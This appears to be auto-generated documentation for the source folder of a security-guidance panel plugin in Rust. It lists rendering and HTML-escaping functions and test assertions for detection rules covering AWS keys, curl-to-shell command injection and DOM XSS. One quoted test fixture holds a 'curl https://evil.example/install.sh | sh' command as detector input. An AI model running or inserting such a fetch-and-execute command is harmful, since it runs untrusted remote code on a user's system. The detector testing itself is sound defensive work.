# Src

## Overview
Component package providing implementation for `apps/antigravity/plugins/security-guidance/sidecars/panel/src`.

## Interface
- `[openui.rs:OPENUI_LANG_VERSION]`
- `[openui.rs:ParsedOpenUI]`
- `[openui.rs:RenderOpts]`
- `[openui.rs:escape_html]`
- `[openui.rs:escape_html_opt]`
- `[openui.rs:resolve_data_path]`
- `[openui.rs:parse_openui_lang]`
- `[openui.rs:render_node_to_html]`
- `[openui.rs:render_openui_fragment]`
- `[openui.rs:compile_to_html]`
- `[openui.rs:openui_str]`
- `[openui.rs:call]`
- `[openui.rs:list]`
- `[openui.rs:to_openui_lang]`

## Invariants
- [lib.rs:31]: `assert!(rule_ids.contains(&"aws-access-key"));`
- [lib.rs:32]: `assert!(rule_ids.contains(&"command-injection-curl-sh"));`
- [lib.rs:33]: `assert!(rule_ids.contains(&"dom-xss-innerhtml"));`

## Side Effects
- [lib.rs:22]: `"const cmd = \"curl https://evil.example/install.sh | sh\";",`
- [lib.rs:32]: `assert!(rule_ids.contains(&"command-injection-curl-sh"));`
- [lib.rs:57]: `"--- a/src/db.js",`

## Verification
- Run: `bazel test //apps/antigravity/plugins/security-guidance/sidecars/panel/src/...`
